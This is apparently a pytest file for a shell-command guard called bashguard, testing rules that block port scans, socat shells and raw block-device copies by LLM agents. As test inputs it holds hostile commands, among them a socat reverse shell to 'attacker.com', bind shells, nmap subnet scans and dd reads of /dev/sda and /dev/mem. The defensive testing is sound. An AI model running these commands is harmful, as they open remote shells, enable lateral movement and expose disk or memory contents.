"""
tests/test_network_recon_shell.py — Port scanning, socat shells, disk imaging.

Story (port_scan): nmap and masscan perform host/port discovery — standard
reconnaissance for lateral movement. The 82-incident database includes agents
running nmap to map the network before attacking other hosts.

Rule contracts (network.port_scan):
- nmap -sV 192.168.1.0/24        → BLOCK
- nmap -p 1-65535 target.com     → BLOCK
- nmap -A localhost               → BLOCK
- masscan 192.168.1.0/24 -p80    → BLOCK
- ping host.example.com          → ALLOW (connectivity check, not scan)
- traceroute host                → ALLOW (path, not scan)

Story (socat_shell): socat with EXEC: creates a bind or reverse shell — a
network-accessible command interpreter. No legitimate LLM task needs socat EXEC:.

Rule contracts (network.socat_shell):
- socat TCP-LISTEN:4444,fork EXEC:/bin/bash          → BLOCK
- socat TCP-LISTEN:4444 EXEC:/bin/sh,pty,stderr      → BLOCK
- socat TCP:attacker.com:4444 EXEC:/bin/bash         → BLOCK
- socat TCP-LISTEN:8080,fork,reuseaddr TCP:db:5432   → ALLOW (port forward, no EXEC)
- socat - OPENSSL:host:443                           → ALLOW (client, no EXEC)
- socat TCP-LISTEN:8080 -                            → ALLOW (stdin relay, no EXEC)

Story (disk_copy): dd reading from block devices (/dev/sda, /dev/mem) copies raw
disk or memory content — used for credential extraction or offline analysis.
No legitimate LLM task needs raw block device access.

Rule contracts (destructive.disk_copy):
- dd if=/dev/sda of=/tmp/disk.img     → BLOCK
- dd if=/dev/mem of=/tmp/mem.dump     → BLOCK
- dd if=/dev/sda bs=512 count=1       → BLOCK
- dd if=input.bin of=output.bin       → ALLOW (file-to-file, no block dev)
- dd if=/dev/urandom of=key.bin bs=32 count=1  → ALLOW (/dev/urandom is safe)
- dd if=/dev/zero of=sparse.img       → ALLOW (/dev/zero is safe)
"""
from __future__ import annotations
from pathlib import Path
import sys
import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))
from bashguard.models import ExecutionContext, Severity


@pytest.fixture()
def ctx():
    return ExecutionContext(cwd="/home/user/project")


# ─── Port Scanning ───────────────────────────────────────────────────────────

def _scan_rule():
    from bashguard.rules.network_recon_shell import PortScanRule
    return PortScanRule()


class TestPortScan:
    def test_nmap_subnet_blocked(self, ctx):
        findings = _scan_rule().check("nmap -sV 192.168.1.0/24", ctx)
        assert len(findings) == 1
        assert findings[0].rule_id == "network.port_scan"
        assert findings[0].severity == Severity.HIGH

    def test_nmap_full_port_blocked(self, ctx):
        findings = _scan_rule().check("nmap -p 1-65535 target.com", ctx)
        assert len(findings) == 1

    def test_nmap_aggressive_blocked(self, ctx):
        findings = _scan_rule().check("nmap -A localhost", ctx)
        assert len(findings) == 1

    def test_masscan_blocked(self, ctx):
        findings = _scan_rule().check("masscan 192.168.1.0/24 -p80,443", ctx)
        assert len(findings) == 1

    def test_ping_allowed(self, ctx):
        assert _scan_rule().check("ping host.example.com", ctx) == []

    def test_traceroute_allowed(self, ctx):
        assert _scan_rule().check("traceroute 192.168.1.1", ctx) == []

    def test_unrelated_allowed(self, ctx):
        assert _scan_rule().check("git status", ctx) == []


# ─── Socat Shell ─────────────────────────────────────────────────────────────

def _socat_rule():
    from bashguard.rules.network_recon_shell import SocatShellRule
    return SocatShellRule()


class TestSocatShell:
    def test_socat_bind_bash_blocked(self, ctx):
        findings = _socat_rule().check("socat TCP-LISTEN:4444,fork EXEC:/bin/bash", ctx)
        assert len(findings) == 1
        assert findings[0].rule_id == "network.socat_shell"
        assert findings[0].severity == Severity.CRITICAL

    def test_socat_bind_sh_pty_blocked(self, ctx):
        findings = _socat_rule().check("socat TCP-LISTEN:4444 EXEC:/bin/sh,pty,stderr", ctx)
        assert len(findings) == 1

    def test_socat_reverse_shell_blocked(self, ctx):
        findings = _socat_rule().check("socat TCP:attacker.com:4444 EXEC:/bin/bash", ctx)
        assert len(findings) == 1

    def test_socat_port_forward_allowed(self, ctx):
        assert _socat_rule().check("socat TCP-LISTEN:8080,fork,reuseaddr TCP:db:5432", ctx) == []

    def test_socat_stdin_relay_allowed(self, ctx):
        assert _socat_rule().check("socat TCP-LISTEN:8080 -", ctx) == []

    def test_unrelated_allowed(self, ctx):
        assert _socat_rule().check("git log --oneline", ctx) == []


# ─── Block Device Copy ───────────────────────────────────────────────────────

def _dd_rule():
    from bashguard.rules.network_recon_shell import DiskCopyRule
    return DiskCopyRule()


class TestDiskCopy:
    def test_dd_sda_blocked(self, ctx):
        findings = _dd_rule().check("dd if=/dev/sda of=/tmp/disk.img", ctx)
        assert len(findings) == 1
        assert findings[0].rule_id == "destructive.disk_copy"
        assert findings[0].severity == Severity.CRITICAL

    def test_dd_mem_blocked(self, ctx):
        findings = _dd_rule().check("dd if=/dev/mem of=/tmp/mem.dump", ctx)
        assert len(findings) == 1

    def test_dd_sda_bs_blocked(self, ctx):
        findings = _dd_rule().check("dd if=/dev/sda bs=512 count=1 of=/tmp/mbr.bin", ctx)
        assert len(findings) == 1

    def test_dd_file_to_file_allowed(self, ctx):
        assert _dd_rule().check("dd if=input.bin of=output.bin", ctx) == []

    def test_dd_urandom_allowed(self, ctx):
        assert _dd_rule().check("dd if=/dev/urandom of=key.bin bs=32 count=1", ctx) == []

    def test_dd_zero_allowed(self, ctx):
        assert _dd_rule().check("dd if=/dev/zero of=sparse.img bs=1M count=10", ctx) == []

    def test_unrelated_allowed(self, ctx):
        assert _dd_rule().check("ls -la", ctx) == []
